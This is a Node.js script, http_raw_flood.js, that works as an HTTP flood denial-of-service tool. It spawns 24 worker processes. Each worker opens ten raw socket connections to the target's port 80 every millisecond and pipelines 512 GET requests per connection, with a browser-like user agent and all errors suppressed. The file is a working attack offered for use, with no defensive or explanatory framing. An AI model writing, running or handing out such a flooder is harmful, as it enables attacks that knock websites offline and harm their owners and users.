const net = require('net');
const cluster = require('cluster');
const numCPUs = 24;

if (cluster.isPrimary) {
    if (process.argv.length <= 2) {
        console.log("Usage: node http_raw_flood.js <url> <time_in_seconds>");
        process.exit(-1);
    }

    const target = process.argv[2];
    const parsed = new URL(target);
    const time = parseInt(process.argv[3]) * 1000;

    console.log(`Starting flood on ${target} for ${process.argv[3]} seconds using ${numCPUs} workers`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, time);
} else {
    const target = process.argv[2];
    const parsed = new URL(target);
    const time = parseInt(process.argv[3]) * 1000;

    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});

    const staticHeaders = {
        accept: "text/html,*/*;q=0.8",
        acceptEncoding: "gzip,deflate",
        acceptLanguage: "en-US",
        connection: "keep-alive"
    };

    const userAgents = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/148.0.0.0 Safari/537.36"
    ];
	
    let currentUserAgentIndex = 0;
    let connectionCounter = 0;

    const createConnection = () => {
        const s = new net.Socket();
        s.connect(80, parsed.host);
        s.setTimeout(5000);

        connectionCounter++;
        if (connectionCounter % 100 === 0) {
            currentUserAgentIndex = (currentUserAgentIndex + 1) % userAgents.length;
        }

        const request = [
            `GET ${parsed.pathname || '/'} HTTP/1.1`,
            `Host: ${parsed.host}`,
            `User-Agent: ${userAgents[currentUserAgentIndex]}`,
            `Accept: ${staticHeaders.accept}`,
            `Accept-Encoding: ${staticHeaders.acceptEncoding}`,
            `Accept-Language: ${staticHeaders.acceptLanguage}`,
            `Connection: ${staticHeaders.connection}`,
            `\r\n`
        ].join('\r\n');

        for (let i = 0; i < 512; i++) {
            s.write(request);
        }

        s.on('data', () => {
            setTimeout(() => {
                s.destroy();
            }, 4000);
        });

        s.on('error', () => {});
    };

    const flood = () => {
        for (let i = 0; i < 10; i++) {
            createConnection();
        }
    };

    const int = setInterval(flood, 1);
}
